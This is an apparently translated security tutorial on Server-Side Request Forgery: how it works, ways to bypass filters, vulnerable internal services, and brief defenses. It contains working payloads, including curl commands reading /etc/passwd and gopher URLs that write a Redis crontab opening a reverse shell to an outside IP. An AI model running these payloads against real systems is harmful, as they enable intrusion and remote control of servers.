SSRF
========================================

Introduction
----------------------------------------
Server Side Request Forgery (SSRF) refers to the attacker using server vulnerabilities to send a constructed request as the server to the intranet where the server is located when the attacker fails to obtain all permissions of the server. SSRF attacks typically target internal systems that are not directly accessible to external networks.

Vulnerability hazards
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SSRF can perform port scanning on the external network, the internal network where the server is located, and the local area, attack applications running on the internal network or locally, or use the File protocol to read local files.

The defense of intranet services is generally weaker than that of external network services. Some intranet services even do not set permission verification for access to the intranet for the convenience of operation and maintenance. Therefore, when SSRF exists, it usually causes greater harm.

Utilization method
----------------------------------------
There are many forms of SSRF exploitation and different scenarios, and different exploitation and bypass methods can be used for different scenarios.

Taking curl as an example, you can use the dict protocol to operate Redis, the file protocol to read files, and the gopher protocol to bounce Shell. Common payloads are as follows:

:: 

    curl -vvv 'dict://127.0.0.1:6379/info'

    curl -vvv 'file:///etc/passwd' 

    # * 注意: 链接使用单引号，避免$变量问题

    curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a' 

Relevant hazard function
----------------------------------------
The dangerous functions involved in SSRF are mainly network access and support pseudo-protocol network reading. Taking PHP as an example, the functions involved include ``file_get_contents()`` / ``fsockopen()`` / ``curl_exec()``, etc.

filter bypass
----------------------------------------

Change the way IP address is written
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Some developers will filter out intranet IPs by regular matching the passed URL parameters, such as using the following regular expression:

- ``^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$``
- ``^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$``
- ``^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$``

For this kind of filtering, we use the method of rewriting the IP to bypass it. For example, the IP address 192.168.0.1 can be rewritten as:

- Octal format: 0300.0250.0.1
- Hexadecimal format: 0xC0.0xA8.0.1
- Decimal integer format: 3232235521
- Hexadecimal integer format: 0xC0A80001
- Combined last two digits: 1.1.278 / 1.1.755
- Combined three digits: 1.278 / 1.755 / 3.14159267

In addition, each digit in IP can be mixed in different bases.

When accessing the rewritten IP address, Apache will report a 400 Bad Request, but other services such as Nginx and MySQL can still work normally.

In addition, the IP address 0.0.0.0 can be directly accessed locally and is usually missed by regular filtering.

Use a domain name that resolves to the intranet
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If the server does not resolve the IP first and then filter the intranet address, we can use localhost to resolve the intranet domain name.

In addition, ``xip.io`` provides a convenient service. The subdomain name of this website will be resolved to the corresponding IP, such as 192.168.0.1.xip.io, which will be resolved to 192.168.0.1.

Exploiting problems with parsing URLs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In some cases, the backend program may parse the accessed URL and filter the parsed host address. At this time, there may be improper parsing of URL parameters, which can bypass filtering.

For example ``http://www.baidu.com@192.168.0.1/`` When the back-end program parses the content of the above URL through incorrect regular expressions (for example, when the character content after http to com, that is, www.baidu.com, is considered to be the host address of the access request), it is very likely that the host of the access URL is www.baidu.com, but in fact the content requested by this URL is the content on 192.168.0.1.

Use jump
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If the backend server correctly parses the host of the URL and performs filtering after receiving the parameters, we can use a jump to bypass it at this time.

You can use services such as http://httpbin.org/redirect-to?url=http://192.168.0.1 to redirect. However, since the URL contains an intranet IP address such as 192.168.0.1, it may be filtered out by regular expressions and can be bypassed by using a short address.

Commonly used jumps include 302 jump and 307 jump. The difference is that 307 jump will forward the data in the POST request, etc., but 302 jump will not.

Via various non-HTTP protocols
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This can be exploited via non-HTTP protocols if the server-side program verifies the protocol used to access the URL.

For example, through gopher, you can construct a POST or GET request in a url parameter to achieve the purpose of attacking intranet applications. For example, you can use the gopher protocol to attack the Redis service on the intranet. You can use the following URL:

::

    gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

In addition to the gopher protocol, the File protocol is also a commonly used protocol in SSRF. This protocol is mainly used to access files in the local computer. We can access local files on the computer through a format like ``file:///path/to/file``. Using the file protocol can avoid filtering of accessed IPs by the server program. For example, we can access the contents of 1.txt in the D drive through ``file:///d:/1.txt``.

DNS Rebinding
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
A common protection idea is: for the URL parameters requested by the user, the server will first perform DNS analysis on it, and then judge the IP address returned by the DNS server. If it is in the blacklist, the request will be prohibited.

However, in the whole process, there is a time difference between the first time the DNS service is requested for domain name resolution and the second time the server requests the URL. This time difference can be used to carry out DNS rebinding attacks.

To complete the DNS rebinding attack, we need a domain name, and specify the resolution of this domain name to our own DNS Server, write a resolution service on our controllable DNS Server, and set the TTL time to 0. In this way, the attack can be carried out. The complete attack process is:

- The server side obtains the URL parameters, performs the first DNS resolution, and obtains a non-intranet IP
- Judge the obtained IP and if it is found to be a non-blacklisted IP, it will pass the verification.
- When the server accesses the URL, since the TTL set by the DNS server is 0, DNS resolution is performed again. This time the DNS server returns the intranet address.
- Since the verification has been bypassed, the server returns the result of accessing intranet resources.

As DNS Rebinding technology continues to develop, there are also some new attack methods:

- In one response, reply to multiple IP requests at the same time, including public network and intranet IPs
- When the browser requests A record and AAAA record at the same time, it will reply to the legal IPv6 address first, and then reply to the intranet IPv4 address after a period of time.

Taking advantage of IPv6
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Some services do not consider IPv6, but if the intranet supports IPv6, you can use IPv6 local IP such as ``[::]`` ``0000::1`` or IPv6 intranet domain name to bypass filtering.


Leveraging IDNs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Some network access tools such as Curl support internationalized domain names (IDNs). Internationalized domain names, also known as special character domain names, refer to Internet domain names that are partially or completely composed of special characters or letters.

Among these characters, some characters will be equivalently converted during access, such as ``ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`` and ``example.com`` are equivalent. In this way, you can use characters such as ``① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩`` to bypass intranet restrictions.

Possible use points
----------------------------------------

Intranet services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Apache Hadoop remote command execution
- axis2-admin deploys Server command execution
- Confluence SSRF
- counchdb WEB API remote command execution
- dict
- docker API remote command execution
- Elasticsearch engine Groovy script command execution
- ftp/ftps (FTP blasting)
- glassfish arbitrary file reading and war file deployment indirect command execution
- gopher
- HFS remote command execution
- http、https
- imap/imaps/pop3/pop3s/smtp/smtps (exploit email username and password)
- Java debugging interface command execution
- JBOSS remote Invoker war command execution
- Jenkins Scripts interface command execution
- ldap
- mongodb
- php_fpm/fastcgi command execution
- rtsp - smb/smbs (connect SMB)
- sftp
- ShellShock command execution
- Struts2 command execution
- telnet
- tftp (UDP protocol extension)
- tomcat command execution
- WebDav PUT upload any file
- WebSphere Admin can deploy war to execute indirect commands
- zentoPMS remote command execution

Redis utilization
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Write ssh public key
- write crontab
-Write WebShell
- Windows write startup items
- Master-slave copy loading .so file
- Master-slave copy and write lossless files

Cloud host
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In cloud environments such as AWS and Google, by accessing the metadata API or management API of the cloud environment, sensitive information and other effects can be achieved in some cases.

defense mode
----------------------------------------
- Filter the returned information
- Unify error messages
- Limit requested ports
- Ban uncommon protocols
- For DNS Rebinding, consider using DNS cache or Host whitelist

Reference link
----------------------------------------
- `SSRF vulnerability analysis and utilization <http://www.91ri.org/17111.html>`_
- `A New Era Of SSRF <https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>`_
- `php ssrf technique <https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51>`_
- `Talk about how to deny SSRF vulnerabilities in Python development <https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html>`_
- `SSRF Tips <http://blog.safebuff.com/2016/07/03/SSRF-Tips/>`_
- `SSRF in PHP <https://joychou.org/web/phpssrf.html>`_
